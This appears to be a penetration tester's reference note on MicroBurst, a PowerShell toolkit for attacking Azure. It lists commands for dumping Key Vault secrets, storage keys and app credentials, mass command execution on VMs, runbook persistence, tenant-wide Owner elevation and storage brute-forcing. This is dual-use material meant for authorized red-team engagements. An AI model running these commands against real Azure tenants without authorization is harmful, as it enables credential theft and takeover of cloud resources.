# MicroBurst

**Tags:** `#microburst` `#azure` `#cloud` `#enumeration` `#powershell` `#storageaccount` `#keyvault` `#privesc`

PowerShell Azure attack toolkit from NetSPI — the closest Azure equivalent to Pacu for resource-level enumeration. Covers storage accounts, Key Vault secrets, service principals, Azure Functions, app service configs, and finding cleartext credentials baked into deployments. Complements AADInternals (identity-focused) with Azure resource-level coverage.

**Source:** https://github.com/NetSPI/MicroBurst
**Install:**
```powershell
git clone https://github.com/NetSPI/MicroBurst
Import-Module .\MicroBurst.psm1

# Requires Az module
Install-Module Az -Scope CurrentUser
Connect-AzAccount
```

> [!note] **MicroBurst vs AADInternals** — AADInternals focuses on Entra ID / identity attacks (users, tokens, PRT, AD Connect). MicroBurst focuses on Azure resource enumeration and credential harvesting from storage, Key Vault, app configs. Use both on Azure engagements.

> [!warning] **Verified against the live repo (2026-09-27, function file names in `Az/`, `REST/`, `Misc/`).** The **Az-module** path has no granular `Get-AzKeyVaultSecrets`/`Get-AzStorageKeys`/`Get-AzAppSecrets`/`Get-AzPermissions` cmdlets — those were invented in older notes; it funnels through **`Get-AzPasswords`** (all credential stores) and **`Get-AzDomainInfo`** (all resources). **But the REST module (`MicroBurst-AzureREST`) *does* expose granular per-store grabbers** with a `REST` suffix: `Get-AzKeyVaultSecretsREST`, `Get-AzKeyVaultKeysREST`, `Get-AZStorageKeysREST`, `Get-AzAutomationAccountCredsREST`. Always confirm names with `Get-Command -Module MicroBurst*`.

---

## Credential Hunting — `Get-AzPasswords`

The main reason to use MicroBurst. **One function** dumps every reachable credential store — Key Vault secrets/keys/certs, Storage Account keys, App Service & Function configs, Automation account credentials + connection strings, Container Registry admin creds, and more.

```powershell
# Dump everything (runs all sub-modules by default)
Get-AzPasswords -Verbose
Get-AzPasswords -Subscription <sub-id>          # scope to one subscription
Get-AzPasswords -Verbose | Out-File creds.txt   # capture — output is long

# Related credential grabbers (all real, in Az/)
Get-AzWebAppTokens               # managed-identity / app tokens from App Services
Get-AzKeyVaultsAutomation        # Key Vault access via Automation account context
Get-AzArcCertificates            # Azure Arc-connected machine certs
Get-AzMachineLearningCredentials # AML workspace secrets
Invoke-AzHybridWorkerExtraction  # creds/certs from an Automation Hybrid Runbook Worker

# Granular REST-based grabbers (no Az module needed — MicroBurst-AzureREST)
Get-AzKeyVaultSecretsREST
Get-AZStorageKeysREST
Get-AzAutomationAccountCredsREST

# More verified credential/data grabbers (2026-09-28, confirmed in Az/ and Misc/)
Get-AzAppConfiguration                    # App Configuration store — connection strings / feature secrets
Get-AzureVMExtensionSettings              # VM extension config incl. protectedSettings (often creds)
Get-AzureVMExtensionSettingsWireServer    # same, pulled via the host WireServer agent
Get-AzAppRegistrationManifest             # app manifests (may reveal secrets/permissions)
Get-AzAutomationCustomModules             # custom Automation modules (can hide creds/backdoors)
Get-AzBatchAccountData                    # Batch account data/keys
Get-AzMachineLearningData                 # AML workspace data
```

---

## Resource Enumeration — `Get-AzDomainInfo`

```powershell
# Full subscription recon in one shot — dumps to CSV/HTML under the output folder:
# VMs, NICs/public IPs & NSG rules, storage accounts + keys, Key Vaults, web/function apps,
# SQL servers/DBs, RBAC role assignments, users/groups, etc.
Get-AzDomainInfo -Verbose
Get-AzDomainInfo -Subscription <sub-id>
Get-AzDomainInfoREST              # REST-based variant (no Az module dependency)
```

---

## Command Execution & Lateral Movement

```powershell
# Run a command on EVERY VM you can reach (needs Microsoft.Compute/.../runCommand)
Invoke-AzVMBulkCMD -Script "whoami" -output results.txt
Invoke-AzVMCommandREST -Script "whoami"          # REST variant

# App Service / Kudu command execution (webshell-equivalent on a web app)
Invoke-AzAppServicesCMD -command "whoami" -appName <app-name>
Invoke-AzAppServicesKuduDebug -appName <app-name>   # (real name — NOT "Invoke-AzAppServKuduCMDExec")

# VM command exec via a DSC extension (alternative to RunCommand)
Invoke-DscVmExtension

# Automation-account exec/persistence (there is NO "Invoke-AzRunbook" function):
#   AutomationRunbook-OwnerPersist.ps1  — upload a runbook that grants Owner (persistence)
#   KeyVaultRunBook.ps1                 — runbook that pulls Key Vault secrets
#   Invoke-AzUADeploymentScript         — run code as a user-assigned managed identity (also privesc)

# Azure Bastion shareable-link abuse (persistent RDP/SSH exposure) — REST module
Get-AzRestBastionShareableLink
Invoke-AzRESTBastionShareableLink
```

---

## Privilege Escalation

```powershell
# The classic MicroBurst privesc: if you hold User Access Administrator eligibility,
# toggle "Access management for Azure resources" ON to grant yourself Owner over ALL
# subscriptions in the tenant (root-scope elevation).
Invoke-AzElevatedAccessToggle

# ACR token generation (registry access → pull/push malicious images)
Invoke-AzACRTokenGenerator
```

---

## Unauthenticated Storage Brute Force

```powershell
# Find open/public Azure storage by guessing account names (no auth needed)
Invoke-EnumerateAzureBlobs      -Base <company-name>    # blobs in a named account
Invoke-EnumerateAzureSubDomains -Base <company-name>    # *.blob/file/table/queue/web/etc.
```

---

> [!note] **See also** — pair with [[Tools/Cloud/AADInternals|AADInternals]] (identity/Entra side) and [[Tools/Cloud/ScoutSuite|ScoutSuite]] (misconfig audit); the ARM-token abuse primitives overlap [[Tools/Cloud/BARK|BARK]]'s `*-AzureRM*` functions. Used against [[Services/Active Directory/Entra ID|Entra ID]] for the resource-plane pivot (IMDS/managed-identity token theft, VM RunCommand, storage-key extraction); the CLI equivalent is [[Tools/Cloud/azure-cli|az]].

---

*Created: 2026-03-06*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
